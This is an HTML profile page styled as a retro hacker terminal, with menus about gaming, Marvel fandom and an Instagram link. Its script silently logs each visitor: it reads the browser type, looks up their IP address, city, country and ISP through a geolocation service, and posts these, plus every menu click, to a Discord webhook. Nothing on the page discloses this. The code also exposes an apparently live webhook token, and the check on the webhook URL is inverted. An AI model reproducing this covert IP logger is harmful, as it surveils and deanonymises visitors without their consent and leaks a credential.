<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sajid | Terminal Mainframe</title>
    <style>
        html, body { 
            height: 100%; 
            background-color: #050505; 
            margin: 0; 
            padding: 0;
            box-sizing: border-box;
        }
        body { 
            color: #00ff33; 
            font-family: 'Courier New', Courier, monospace; 
            padding: 20px; 
            font-size: 14px; 
            line-height: 1.6; 
            overflow-x: hidden;
        }
        .line { margin-bottom: 8px; white-space: pre-wrap; word-break: break-all; }
        .header-box { color: #ffffff; font-weight: bold; text-shadow: 0 0 5px rgba(255,255,255,0.2); }
        .accent-text { color: #00ffff; }
        .btn-container { 
            margin-top: 25px; 
            display: flex; 
            flex-direction: column; 
            gap: 12px; 
            max-width: 280px; 
        }
        .menu-btn {
            background: transparent;
            color: #00ff33;
            border: 1px solid #00ff33;
            padding: 10px;
            font-family: inherit;
            font-size: 13px;
            font-weight: bold;
            text-align: left;
            cursor: pointer;
            border-radius: 4px;
            transition: all 0.2s ease;
            box-shadow: 0 0 4px rgba(0, 255, 51, 0.2);
        }
        .menu-btn:hover, .menu-btn:active {
            background-color: #00ff33;
            color: #050505;
            box-shadow: 0 0 10px rgba(0, 255, 51, 0.6);
        }
        #interactive-output {
            margin-top: 20px;
            padding: 10px;
            border-left: 2px dashed #00ffff;
            min-height: 40px;
            display: none;
        }
    </style>
</head>
<body>

<div id="mainframe"></div>
<div id="interactive-output"></div>

<script>
// --- CONFIGURATION ---
// ⚠️ PASTE YOUR DISCORD WEBHOOK URL INSIDE THE QUOTES BELOW
const DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"; 
const mainframe = document.getElementById('mainframe');
const outputBox = document.getElementById('interactive-output');
let totalVisits = "Fetching...";
let geoDataString = "Fetching location details...";

// --- SMART DEVICE DETECTOR ---
const userAgent = navigator.userAgent.toLowerCase();
let deviceType = "📱 Mobile Device";

if (userAgent.includes("facebookexternalhit") || userAgent.includes("meta-external") || userAgent.includes("bot") || userAgent.includes("spider")) {
    deviceType = "🚨 META CRAWLER / SECURITY BOT";
} else if (userAgent.includes("instagram")) {
    deviceType = "📸 Instagram In-App Browser";
} else if (userAgent.includes("iphone") || userAgent.includes("ipad")) {
    deviceType = "🍏 iPhone / iOS Device";
} else if (userAgent.includes("android")) {
    deviceType = "🤖 Android Device";
} else if (userAgent.includes("windows") || userAgent.includes("macintosh")) {
    deviceType = "💻 Desktop PC / Laptop";
}

function fetchHitCounter() {
    fetch("https://counterapi.dev")
    .then(response => response.json())
    .then(data => {
        if(data && data.count) { 
            totalVisits = data.count;
            document.getElementById('packet-count').textContent = totalVisits + " network packets";
        }
    })
    .catch(() => { totalVisits = "Active"; });
}

// --- FAST GEOLOCATION TRACKER ---
function fetchLocationAndLog() {
    fetch("https://ipwho.is")
    .then(res => res.json())
    .then(data => {
        if (data && data.success) {
            geoDataString = `📍 **Location:** ${data.city}, ${data.region}, ${data.country}\n🌐 **IP Address:** ${data.ip}\n🏢 **ISP Network:** ${data.connection.isp}`;
        } else {
            geoDataString = "❌ Location profile hidden/unavailable.";
        }
        sendDiscordAlert("🟢 Live Visitor Connected", "User is reading your main dashboard contents.");
    })
    .catch(() => {
        geoDataString = "⚠️ Network lookup restriction.";
        sendDiscordAlert("🟢 Live Visitor Connected", "User is reading your main dashboard contents.");
    });
}

function printDashboard() {
    appendLine("⚙️ Connecting to mohammadsajid116 Mainframe...", "accent-text");
    appendLine("✅ Establishing secure layout wrapper... ONLINE.");
    appendLine("--------------------------------------------------");
    appendLine("   ⚡ WELCOME TO SAJID'S DIGITAL SANDBOX ⚡", "header-box");
    appendLine("--------------------------------------------------");
    appendLine("👤 PROFILE: SAJID");
    appendLine("🚀 STATUS : Exploring new tech & building creative spaces.");
    appendLine("📊 TRAFFIC: Processing entries across <span id='packet-count'>loading...</span>.");
    appendLine("--------------------------------------------------");
    appendLine("👉 Select a module below to inspect system details:", "accent-text");

    // Inject Interactive Menu Buttons
    const btnContainer = document.createElement('div');
    btnContainer.className = 'btn-container';
    btnContainer.innerHTML = `
        <button class="menu-btn" onclick="triggerModule('GAMES')">> [🎮] Current Gaming Loadout</button>
        <button class="menu-btn" onclick="triggerModule('MARVEL')">> [🍿] Marvel Universe Logs</button>
        <button class="menu-btn" onclick="triggerModule('INSTAGRAM')">> [💬] Open Secure DM Channel</button>
    `;
    mainframe.appendChild(btnContainer);
}

function appendLine(text, customClass = "") {
    const div = document.createElement('div');
    div.className = 'line ' + customClass;
    div.innerHTML = text;
    mainframe.appendChild(div);
}

function sendDiscordAlert(eventTitle, detailValue) {
    if (DISCORD_WEBHOOK_URL !== "https://discord.com/api/webhooks/1542059603406356540/CCMUEg9CrtIVAa9b-fqm7nNtDkgP9bvOQSfy3l_A5qXaqAx2yGAh5xn1PqNluHpk8Th0") {
        const isBot = deviceType.includes("CRAWLER");
        const payload = {
            embeds: [{
                title: eventTitle,
                color: isBot ? 16711680 : 3342080, // Green for human interaction
                fields: [
                    { name: "Current Action", value: detailValue, inline: false },
                    { name: "Platform / Device", value: deviceType, inline: false },
                    { name: "Network Telemetry Data", value: geoDataString, inline: false },
                    { name: "Timestamp", value: new Date().toLocaleString(), inline: true }
                ]
            }]
        };
        fetch(DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).catch(err => console.error(err));
    }
}

function triggerModule(moduleType) {
    outputBox.style.display = "block";
    outputBox.style.color = "#00ffff";
    
    if (moduleType === 'GAMES') {
        outputBox.innerHTML = `<strong>[SYSTEM LOGS]:</strong> Currently playing story-driven open-world titles, high-octane racing sims, and multiplayer strategies!`;
        sendDiscordAlert("🎯 Menu Interaction", "Visitor expanded the **[🎮 Gaming Loadout]** module.");
    } 
    else if (moduleType === 'MARVEL') {
        outputBox.innerHTML = `<strong>[SYSTEM LOGS]:</strong> Massive Marvel comics fan. Hooked on deep timeline lore, variants, and MCU cinematic universes.`;
        sendDiscordAlert("🎯 Menu Interaction", "Visitor expanded the **[🍿 Marvel Logs]** module.");
    } 
    else if (moduleType === 'INSTAGRAM') {
        outputBox.innerHTML = `<strong>[SYSTEM LOGS]:</strong> Redirecting secure pipeline to Instagram DMs...`;
        sendDiscordAlert("🚀 External Exit Redirect", "Visitor clicked the link to **[💬 Open DM Channel]**!");
        setTimeout(() => {
            window.location.href = "https://instagram.com";
        }, 1000);
    }
    window.scrollTo(0, document.body.scrollHeight);
}

window.onload = () => { 
    printDashboard();
    fetchHitCounter(); 
    fetchLocationAndLog(); 
};
</script>
</body>
</html>
